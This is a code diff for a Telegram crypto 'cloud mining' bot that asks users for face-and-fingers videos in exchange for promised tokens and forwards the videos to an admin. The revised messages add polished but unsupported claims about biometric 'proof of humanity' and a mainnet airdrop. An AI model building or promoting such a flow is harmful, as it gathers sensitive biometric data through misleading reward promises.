@@ -15,26 +15,37 @@ export default async function handler(req, res) {
     'Content-Type': 'application/json'
   };
 
-  // ১. /start কমান্ড হ্যান্ডেল করা
+  // 1. /start Command Handling
   if (message && message.text && message.text.startsWith('/start')) {
     const chatId = message.chat.id;
     const fullText = message.text.trim();
 
-    // মিনি-অ্যাপ থেকে যখন ইউজার Verify বাটনে চাপ দিয়ে Start করবে
+    // Human Proof Verification Request (/start verify)
     if (fullText.includes('verify')) {
+      const verifyMessage = 
+        `🛡️ <b>XTAP PROTOCOL: HUMAN PROOF VERIFICATION</b>\n\n` +
+        `To prevent Sybil attacks and qualify for the upcoming Mainnet TGE distribution, please submit your biometric proof of humanity.\n\n` +
+        `<b>📋 Submission Instructions:</b>\n` +
+        `• Record a short video clip (or video note).\n` +
+        `• Ensure your face is clearly visible.\n` +
+        `• Show all 5 open fingers toward the camera.\n` +
+        `• Send the video directly in this chat.\n\n` +
+        `<b>🎁 Reward:</b> <code>+300.0000 XTAP</code>\n` +
+        `<b>⚡ Status:</b> Awaiting Video Upload`;
+
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: chatId,
-          text: '📹 <b>Human Proof Verification</b>\n\nদয়া করে আপনার মুখ ও হাতের ৫টি আঙুল দেখিয়ে একটি ছোট ভিডিও বা ভিডিও মেসেজ পাঠান।\n\nএডমিন ভেরিফাই করলে আপনার একাউন্টে <b>300 $XTAP</b> যোগ হবে এবং আপনার একাউন্ট ভেরিফাইড হিসেবে সিলমোহর পাবে!',
+          text: verifyMessage,
           parse_mode: 'HTML'
         })
       });
       return res.status(200).send('OK');
     }
 
-    // সাধারণ রেফারেল বা সাধারণ /start
+    // Default /start & Referral
     const textParts = fullText.split(' ');
     const param = textParts.length > 1 ? textParts[1] : null;
 
@@ -56,11 +67,17 @@ export default async function handler(req, res) {
       body: JSON.stringify({
         chat_id: chatId,
         photo: 'https://xtap-crypto.vercel.app/coin.png',
-        caption: '🚀 Welcome to XTAP Network!\n\n⛏️ Mine XTAP tokens directly to your Pool Wallet.\n📈 Boost your cloud-mining hash rate!\n🔗 Connect your BSC (BEP-20) wallet.\n\nComplete operations to unlock Airdrop!\n\nClick below to start.',
+        caption: 
+          `⚡ <b>Welcome to XTAP Network Protocol</b>\n\n` +
+          `• Decentralized Cloud Farming Engine\n` +
+          `• BEP-20 Settlement Integration\n` +
+          `• Anti-Sybil Proof of Humanity Protected\n\n` +
+          `Launch the terminal below to start mining operations.`,
+        parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [
-            [{ text: '🚀 Start XTAP Mining', web_app: { url: 'https://xtap-crypto.vercel.app' } }],
-            [{ text: '📢 Community', url: 'https://t.me/cryptotapofficial' }]
+            [{ text: '🚀 Launch Terminal', web_app: { url: 'https://xtap-crypto.vercel.app' } }],
+            [{ text: '📢 Official Channel', url: 'https://t.me/Cryptotapxofficial' }]
           ]
         }
       })
@@ -69,24 +86,25 @@ export default async function handler(req, res) {
     return res.status(200).send('OK');
   }
 
-  // ২. ইউজার ভিডিও পাঠালে তা অ্যাডমিনের কাছে পাঠানো
+  // 2. Video Receipt & Forwarding to Admin
   const isVideo = message && (message.video || message.video_note || (message.document && message.document.mime_type && message.document.mime_type.startsWith('video/')));
 
   if (isVideo) {
     const userId = message.from.id;
     const userName = message.from.username ? `@${message.from.username}` : (message.from.first_name || 'Pilot');
 
-    // ইউজারকে বার্তা
+    // Message to User
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: userId,
-        text: '✅ আপনার ভিডিওটি জমা হয়েছে! এডমিন যাচাই করার পর আপনার ব্যালেন্সে 300 $XTAP যুক্ত হবে এবং একাউন্ট ভেরিফাইড হয়ে যাবে।'
+        text: `✅ <b>Submission Received</b>\n\nYour verification video has been queued for protocol validation. Upon approval, <b>300.0000 XTAP</b> will be deposited to your pool vault and your pilot credentials will be upgraded to Verified.`,
+        parse_mode: 'HTML'
       })
     });
 
-    // অ্যাডমিনের কাছে ভিডিও ফরোয়ার্ড
+    // Forward to Admin
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/forwardMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -97,18 +115,18 @@ export default async function handler(req, res) {
       })
     });
 
-    // অ্যাডমিনের কাছে এপ্রুভাল বাটনসহ তথ্য
+    // Admin Decision Panel
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: ADMIN_ID,
-        text: `📹 <b>New Video Submitted!</b>\n\n👤 <b>User:</b> ${userName}\n🆔 <b>User ID:</b> <code>${userId}</code>`,
+        text: `🛡️ <b>New Verification Request</b>\n\n<b>Pilot:</b> ${userName}\n<b>Telegram ID:</b> <code>${userId}</code>\n<b>Action:</b> Review the video above and select verdict.`,
         parse_mode: 'HTML',
         reply_markup: {
           inline_keyboard: [
             [
-              { text: '✅ Approve (300 XTAP)', callback_data: `approve_${userId}` },
+              { text: '✅ Approve (+300 XTAP)', callback_data: `approve_${userId}` },
               { text: '❌ Reject', callback_data: `reject_${userId}` }
             ]
           ]
@@ -119,7 +137,7 @@ export default async function handler(req, res) {
     return res.status(200).send('OK');
   }
 
-  // ৩. অ্যাডমিন যখন Approve বা Reject বাটনে চাপবেন
+  // 3. Admin Callback Handling
   if (callback_query) {
     const adminChatId = callback_query.from.id;
     const data = callback_query.data;
@@ -134,7 +152,6 @@ export default async function handler(req, res) {
       const nowIso = new Date().toISOString();
 
       try {
-        // ১. user_tasks টেবিলে Task 100 এন্ট্রি
         await fetch(`${SUPABASE_URL}/rest/v1/user_tasks`, {
           method: 'POST',
           headers: { ...supabaseHeaders, Prefer: 'resolution=merge-duplicates' },
@@ -146,7 +163,6 @@ export default async function handler(req, res) {
           })
         });
 
-        // ২. users টেবিলে is_verified=true এবং pool_balance + 300
         const userRes = await fetch(`${SUPABASE_URL}/rest/v1/users?telegram_id=eq.${targetUserId}&select=*`, {
           headers: supabaseHeaders
         });
@@ -172,7 +188,8 @@ export default async function handler(req, res) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: targetUserId,
-          text: '🎉 Congratulations! Your video has been approved. 300 $XTAP has been added to your vault balance and your identity is Verified!'
+          text: `🎉 <b>Verification Successful!</b>\n\nYour biometric authentication has been approved.\n\n• Status: <b>Verified ✓</b>\n• Credited: <b>+300.0000 XTAP</b>\n• Mainnet Airdrop: <b>Unlocked</b>`,
+          parse_mode: 'HTML'
         })
       });
 
@@ -182,7 +199,7 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           chat_id: adminChatId,
           message_id: messageId,
-          text: `✅ Verified & Approved! 300 $XTAP credited to User ID: <code>${targetUserId}</code>`,
+          text: `✅ <b>Approved</b>: 300 XTAP credited to Pilot <code>${targetUserId}</code>.`,
           parse_mode: 'HTML'
         })
       });
@@ -194,7 +211,8 @@ export default async function handler(req, res) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: targetUserId,
-          text: '❌ Sorry, your submitted video has been rejected by the admin. Please try again.'
+          text: `❌ <b>Verification Failed</b>\n\nYour video submission did not meet the validation criteria (unclear face or fingers not visible). Please record again and re-submit.`,
+          parse_mode: 'HTML'
         })
       });
 
@@ -204,7 +222,7 @@ export default async function handler(req, res) {
         body: JSON.stringify({
           chat_id: adminChatId,
           message_id: messageId,
-          text: `❌ Video submission was rejected.`,
+          text: `❌ <b>Rejected</b> for Pilot <code>${targetUserId}</code>.`,
           parse_mode: 'HTML'
         })
       });
